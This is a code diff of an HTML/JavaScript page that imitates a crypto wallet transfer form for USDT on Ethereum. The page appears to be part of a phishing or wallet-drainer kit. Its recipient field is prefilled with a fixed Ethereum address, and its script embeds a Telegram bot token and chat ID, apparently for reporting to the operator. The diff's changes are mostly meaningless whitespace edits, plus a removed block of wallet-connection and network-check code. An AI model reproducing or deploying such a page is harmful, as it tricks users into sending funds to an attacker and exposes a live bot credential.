@@ -85,13 +85,13 @@
                 <label class="label">Address or Domain Name</label>
                 <div class="input-row primary">
                     <input id="recipientInput" type="text" placeholder="Search or Enter" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b" />
-                    <span class="paste" onclick="pasteAddress( )">Paste</span>
+                    <span class="paste" onclick="pasteAddress()">Paste</span>
                 </div>
 
                 <label class="label">Destination Network</label>
                 <div class="network-row" id="tokenSelector" onclick="toggleTokenDropdown()">
                     <div class="network-left">
-                        <img id="selectedTokenLogo" src="" alt="Token" class="token-logo">
+                        <img id="selectedTokenLogo" src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" alt="Token" class="token-logo">
                         <span id="selectedTokenName">USDT on Ethereum</span>
                     </div>
                     <svg class="network-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -104,7 +104,7 @@
                 <div class="input-row amount-row">
                     <input id="amountInput" type="number" placeholder="Amount" step="0.01" />
                     <span class="unit" id="tokenUnit">USDT</span>
-                    <span class="max" onclick="setMaxAmount()">Max</span>
+                    <span class="max" onclick="setMaxAmount( )">Max</span>
                 </div>
 
                 <p class="estimate" id="amountInfo">≈ $0.00</p>
@@ -124,7 +124,7 @@
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
         let selectedToken = 'usdt_eth';
 
-        document.addEventListener('DOMContentLoaded', (  ) => {
+        document.addEventListener('DOMContentLoaded', ( ) => {
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
@@ -140,7 +140,7 @@
                     selectToken(key);
                 };
                 option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
-                menu.appendChild(option  );
+                menu.appendChild(option );
             }
         }
 
@@ -235,17 +235,6 @@
             try {
                 if (!window.ethereum) {
                     showError('MetaMask/Trust Wallet not installed');
-                    btn.disabled = false;
-                    btn.textContent = 'Next';
-                    return;
-                }
-
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const userAddress = accounts[0];
-
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (chainId !== token.chainIdHex) {
-                    showError('Please switch to Ethereum network');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
